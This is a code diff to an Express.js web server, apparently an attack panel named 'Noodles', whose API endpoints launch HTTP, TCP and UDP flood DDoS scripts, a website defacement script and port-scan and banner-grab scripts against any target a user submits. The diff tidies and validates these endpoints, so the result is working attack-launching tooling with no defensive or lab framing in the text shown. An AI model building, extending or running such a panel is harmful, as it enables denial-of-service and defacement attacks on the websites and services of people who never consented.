@@ -7,7 +7,6 @@ const { spawn } = require('child_process');
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
-// Function to execute shell commands
 function executeCommand(command, args) {
     return new Promise((resolve, reject) => {
         const process = spawn(command, args);
@@ -33,11 +32,15 @@ function executeCommand(command, args) {
     });
 }
 
-// DDoS attack endpoint
 app.post('/api/ddos', async (req, res) => {
     const target = req.body.target;
     const type = req.body.type;
-    const duration = req.body.duration || 60; // Default duration: 60 seconds
+    const duration = req.body.duration || 60;
+
+    if (!target || !type) {
+        return res.status(400).send({ status: 'Target and type are required' });
+    }
+
     console.log(`DDoS attack requested: Target=${target}, Type=${type}, Duration=${duration}`);
 
     try {
@@ -47,30 +50,22 @@ app.post('/api/ddos', async (req, res) => {
         switch (type) {
             case 'http':
                 scriptPath = path.join(__dirname, 'scripts', 'ddos', 'http_flood.js');
-                if (!require('fs').existsSync(scriptPath)) {
-                    return res.status(500).send({ status: 'HTTP Flood script not found' });
-                }
-                args = [target, duration];
                 break;
             case 'tcp':
                 scriptPath = path.join(__dirname, 'scripts', 'ddos', 'tcp_flood.js');
-                if (!require('fs').existsSync(scriptPath)) {
-                    return res.status(500).send({ status: 'TCP Flood script not found' });
-                }
-                args = [target, duration];
                 break;
             case 'udp':
                 scriptPath = path.join(__dirname, 'scripts', 'ddos', 'udp_flood.js');
-                if (!require('fs').existsSync(scriptPath)) {
-                    return res.status(500).send({ status: 'UDP Flood script not found' });
-                }
-                args = [target, duration];
                 break;
             default:
                 return res.status(400).send({ status: 'Invalid DDoS attack type' });
         }
 
-        // Execute the DDoS attack script
+        if (!require('fs').existsSync(scriptPath)) {
+            return res.status(500).send({ status: `${type.toUpperCase()} Flood script not found` });
+        }
+
+        args = [target, duration];
         await executeCommand('node', [scriptPath, ...args]);
         res.send({ status: `DDoS attack initiated (${type}) on ${target} for ${duration} seconds` });
     } catch (error) {
@@ -79,21 +74,25 @@ app.post('/api/ddos', async (req, res) => {
     }
 });
 
-// Defacement endpoint
 app.post('/api/defacement', async (req, res) => {
     const target = req.body.target;
     const action = req.body.action;
     const content = req.body.content;
+
+    if (!target || !action) {
+        return res.status(400).send({ status: 'Target and action are required' });
+    }
+
     console.log(`Defacement requested: Target=${target}, Action=${action}`);
 
     try {
         const scriptPath = path.join(__dirname, 'scripts', 'defacement', 'deface.js');
+
         if (!require('fs').existsSync(scriptPath)) {
             return res.status(500).send({ status: 'Deface script not found' });
         }
-        const args = [target, action, content];
 
-        // Execute the defacement script
+        const args = [target, action, content];
         await executeCommand('node', [scriptPath, ...args]);
         res.send({ status: `Defacement initiated (${action}) on ${target}` });
     } catch (error) {
@@ -102,10 +101,14 @@ app.post('/api/defacement', async (req, res) => {
     }
 });
 
-// Connection endpoint
 app.post('/api/connection', async (req, res) => {
     const target = req.body.target;
     const type = req.body.type;
+
+    if (!target || !type) {
+        return res.status(400).send({ status: 'Target and type are required' });
+    }
+
     console.log(`Connection requested: Target=${target}, Type=${type}`);
 
     try {
@@ -115,23 +118,19 @@ app.post('/api/connection', async (req, res) => {
         switch (type) {
             case 'portscan':
                 scriptPath = path.join(__dirname, 'scripts', 'connection', 'port_scan.js');
-                if (!require('fs').existsSync(scriptPath)) {
-                    return res.status(500).send({ status: 'Port Scan script not found' });
-                }
-                args = [target];
                 break;
             case 'bannergrab':
                 scriptPath = path.join(__dirname, 'scripts', 'connection', 'banner_grab.js');
-                if (!require('fs').existsSync(scriptPath)) {
-                    return res.status(500).send({ status: 'Banner Grab script not found' });
-                }
-                args = [target];
                 break;
             default:
                 return res.status(400).send({ status: 'Invalid connection type' });
         }
 
-        // Execute the connection script
+        if (!require('fs').existsSync(scriptPath)) {
+            return res.status(500).send({ status: `${type.replace('scan', ' Scan').replace('grab', ' Grab')} script not found` });
+        }
+
+        args = [target];
         await executeCommand('node', [scriptPath, ...args]);
         res.send({ status: `Connection initiated (${type}) on ${target}` });
     } catch (error) {
@@ -140,17 +139,14 @@ app.post('/api/connection', async (req, res) => {
     }
 });
 
-// About Us page
 app.get('/about', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'about.html'));
 });
 
-// Redirect to index.html
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Start server
 app.listen(port, () => {
     console.log(`Noodles app listening on port ${port}`);
 });
